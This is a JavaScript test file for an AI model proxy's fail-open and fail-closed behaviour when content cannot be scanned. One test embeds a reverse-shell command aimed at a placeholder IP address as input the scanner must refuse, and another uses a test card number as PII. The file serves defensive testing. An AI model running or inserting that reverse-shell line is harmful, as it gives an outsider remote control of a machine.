// Per-file runner:  node --test --import ./test/hermetic-env.mjs test/proxy-fail-mode.test.mjs
//
// The model proxy's "cannot judge" paths — an item past the scan cap, more new items than one request scans,
// tool-call arguments past the cap, an engine error or an evaluation timeout — ask cli/fail-mode.mjs
// resolveFailMode(policy, "modelProxy", { admin, fallback }) what to do, with the fallback the proxy's own
// behaviour (enforce: closed, report: open), so nothing changes until a policy or the admin binding sets
// failMode. The resolver is injected here (createProxy's resolveFailMode option), in process.
import { test, before, after } from "node:test";
import assert from "node:assert/strict";
import { createProxy } from "../model-proxy/server.mjs";
import { startFakeProvider, sendJson, openaiCompletion } from "../model-proxy/test/fake-provider.mjs";
import { request } from "../model-proxy/test/harness.mjs";

const CAP = 2000;
const BIG = `${"lorem ipsum dolor sit amet ".repeat(120)}`;
const ADMIN = { failMode: { modelProxy: "closed" } };
let fp;
before(async () => { fp = await startFakeProvider(); });
after(async () => { await fp?.close(); });

async function proxy(mode, extra = {}) {
  return createProxy({ port: 0, mode, policy: { captureTier: "content-free" }, routes: { "/openai": `${fp.url}/v1` }, maxScanChars: CAP, systemConfig: ADMIN, env: {}, ...extra });
}
const chat = (px, content) => { fp.on((r, res) => sendJson(res, openaiCompletion({ text: "ok" }))); return request(px.url, "/openai/chat/completions", { body: { model: "gpt-fake", messages: [{ role: "user", content }] } }); };
const fixed = (mode, calls) => (policy, surface, opts) => { calls.push({ policy, surface, opts }); return { mode, source: "policy" }; };

test("the resolver is asked for surface modelProxy with the admin binding and the proxy's own behaviour as the fallback", async () => {
  for (const [mode, fallback] of [["enforce", "closed"], ["report", "open"]]) {
    const calls = [];
    const px = await proxy(mode, { resolveFailMode: (p, s, o) => { calls.push({ p, s, o }); return { mode: o.fallback, source: "default" }; } });
    try {
      assert.equal((await chat(px, BIG)).status, mode === "enforce" ? 403 : 200);
      assert.ok(calls.length >= 1, mode);
      for (const c of calls) {
        assert.equal(c.s, "modelProxy");
        assert.equal(c.o.fallback, fallback, mode);
        assert.deepEqual(c.o.admin, ADMIN, "the root-owned binding (here: systemConfig) is passed as admin");
        assert.equal(c.p.captureTier, "content-free", "the loaded policy");
      }
    } finally { await px.close(); }
  }
});

test("with the shipped resolver (no failMode anywhere) nothing changes: enforce refuses an item past the scan cap, report forwards it", async () => {
  const e = await proxy("enforce", { systemConfig: null });
  const r = await proxy("report", { systemConfig: null });
  try {
    const n = fp.requests.length;
    const a = await chat(e, BIG);
    assert.equal(a.status, 403);
    assert.match(a.json.error.message, /not evaluated: over the 2000-character scan cap/);
    assert.equal(fp.requests.length, n);
    assert.equal((await chat(r, BIG)).status, 200);
    assert.equal(fp.requests.length, n + 1);
  } finally { await e.close(); await r.close(); }
});

test("failMode closed (injected) in report mode: an item past the scan cap is refused before the upstream; a judged one is forwarded", async () => {
  const calls = [];
  const px = await proxy("report", { resolveFailMode: fixed("closed", calls) });
  try {
    const n = fp.requests.length;
    const a = await chat(px, BIG);
    assert.equal(a.status, 403, String(a.raw));
    assert.match(a.json.error.message, /not evaluated: over the 2000-character scan cap/);
    assert.equal(fp.requests.length, n, "a cannot-judge item reached the upstream");
    assert.equal((await chat(px, "What is the capital of France?")).status, 200);
    assert.equal(fp.requests.length, n + 1);
  } finally { await px.close(); }
});

test("failMode closed (injected) in report mode: more new items than one request scans is refused", async () => {
  const px = await proxy("report", { resolveFailMode: fixed("closed", []), maxScanItems: 2 });
  try {
    fp.on((r, res) => sendJson(res, openaiCompletion({ text: "ok" })));
    const msgs = ["one", "two", "three"].map((t) => ({ role: "user", content: `question ${t}` }));
    const a = await request(px.url, "/openai/chat/completions", { body: { model: "gpt-fake", messages: msgs } });
    assert.equal(a.status, 403);
    assert.match(a.json.error.message, /not evaluated: more than 2 new items/);
  } finally { await px.close(); }
});

test("failMode open (injected) in enforce mode: an item past the scan cap is forwarded (its prefix still scanned), arguments past the cap are released", async () => {
  const px = await proxy("enforce", { resolveFailMode: fixed("open", []) });
  try {
    const n = fp.requests.length;
    assert.equal((await chat(px, BIG)).status, 200);
    assert.equal(fp.requests.length, n + 1);
    const deny = await chat(px, `${BIG.slice(0, 200)} bash -i >& /dev/tcp/198.51.100.7/4444 0>&1 ${BIG}`);
    assert.equal(deny.status, 403, "a finding in the scanned prefix still refuses: open is about what was not judged");
    fp.on((r, res) => sendJson(res, openaiCompletion({ tools: [{ name: "lookup_notes", input: { q: BIG } }] })));
    const t = await request(px.url, "/openai/chat/completions", { body: { model: "gpt-fake", messages: [{ role: "user", content: "notes?" }] } });
    assert.equal(t.status, 200, String(t.raw));
  } finally { await px.close(); }
  const closed = await proxy("enforce", { resolveFailMode: fixed("closed", []) });
  try {
    fp.on((r, res) => sendJson(res, openaiCompletion({ tools: [{ name: "lookup_notes", input: { q: BIG } }] })));
    const t = await request(closed.url, "/openai/chat/completions", { body: { model: "gpt-fake", messages: [{ role: "user", content: "notes?" }] } });
    assert.equal(t.status, 403);
    assert.match(t.json.error.message, /over the 2000-character scan cap/);
  } finally { await closed.close(); }
});

test("an engine error is a cannot-judge path: closed answers the retryable error and forwards nothing, open forwards", async () => {
  let boom = false;
  const policy = { captureTier: "content-free", get threatPolicy() { if (boom) throw new Error("engine fault"); return {}; } };
  const pc = await proxy("enforce", { policy, resolveFailMode: fixed("closed", []) });
  const po = await proxy("enforce", { policy, resolveFailMode: fixed("open", []) });
  try {
    boom = true;
    const n = fp.requests.length;
    const PII = "my card is 4111 1111 1111 1111";
    const c = await chat(pc, PII);
    assert.equal(c.status, 503, String(c.raw));
    assert.equal(fp.requests.length, n);
    const o = await chat(po, `${PII} (open)`);
    assert.equal(o.status, 200, String(o.raw));
    assert.equal(fp.requests.length, n + 1);
    // The response side: a tool call whose arguments are content-scanned hits the same engine fault.
    const call = { name: "lookup_notes", input: { card: "4111 1111 1111 1111" } };
    fp.on((r, res) => sendJson(res, openaiCompletion({ tools: [call] })));
    const rc = await request(pc.url, "/openai/chat/completions", { body: { model: "gpt-fake", messages: [{ role: "user", content: "notes?" }] } });
    assert.equal(rc.status, 503, String(rc.raw));
    const ro = await request(po.url, "/openai/chat/completions", { body: { model: "gpt-fake", messages: [{ role: "user", content: "notes?" }] } });
    assert.equal(ro.status, 200, String(ro.raw));
    assert.equal(ro.json.choices[0].message.tool_calls[0].function.name, "lookup_notes");
  } finally { boom = false; await pc.close(); await po.close(); }
});

test("through cli/fail-mode.mjs itself: a signed policy's failMode.modelProxy open forwards in enforce mode; the admin binding's closed wins over it", async () => {
  const policy = { captureTier: "content-free", failMode: { modelProxy: "open" } };
  const open = await proxy("enforce", { policy, systemConfig: null });
  const admin = await proxy("enforce", { policy, systemConfig: { failMode: { modelProxy: "closed" } } });
  try {
    assert.equal((await chat(open, BIG)).status, 200);
    const a = await chat(admin, BIG);
    assert.equal(a.status, 403);
    assert.match(a.json.error.message, /not evaluated: over the 2000-character scan cap/);
  } finally { await open.close(); await admin.close(); }
});
